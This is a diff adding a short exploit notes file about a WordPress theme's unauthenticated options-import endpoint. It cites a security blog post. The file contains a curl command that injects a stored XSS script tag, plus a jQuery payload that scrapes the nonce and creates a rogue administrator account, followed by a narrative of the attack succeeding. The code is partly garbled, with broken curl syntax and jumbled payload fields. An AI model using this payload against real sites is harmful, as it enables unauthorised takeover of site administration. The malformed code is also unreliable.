@@ -1,0 +1,23 @@
+Reference  website:- https://blog.nintechnet.com/how-hackers-exploit-xss-vulnerabilities-to-create-admin-accounts-on-your-wordpress-blog/
+
+
+curl 'http://example.com/wp-admin/admin-ajax.php?action=onetone_options_import' data ptions={"top_bar_info_content":"<script src='//127.0.0.1/script.js'></script>", "display_top_ bar":"yes"} 
+
+///Import successful.- $
+
+##Payload 
+u="/wp-admin/user-new.php"; jQuery.get(u, function(e) {jQuery.post(u, {action: "createuser","_wpnonce_create- [1], user_login: "foobar", email: "foo@bar.com", pass1: 
+"foo", pass2:" foo", role: "administrator"})}); user": e.match(/_wpnonce_create-user\"\svalue=\"(.+?)\"/)
+
+
+wordpress target input 
+
+INPUT TARGET => http://example.com/wp-admin/admin-ajax.php
+
+
+
+
+From a terminal, the unauthenticated attacker uses the curl command to send a POST request to inject the malicious script (<script src='//127.0.0.1/script.js'></script>) into the front-end page. The injected code can be seen in the source of the page.
+The admin logs in, and we can see there’s only one admin user registered on the blog.
+The admin quickly visits the front-end, while being logged-in: the malicious JavaScript code is silently triggered in the background.
+A new “foobar” admin account was successfully created.
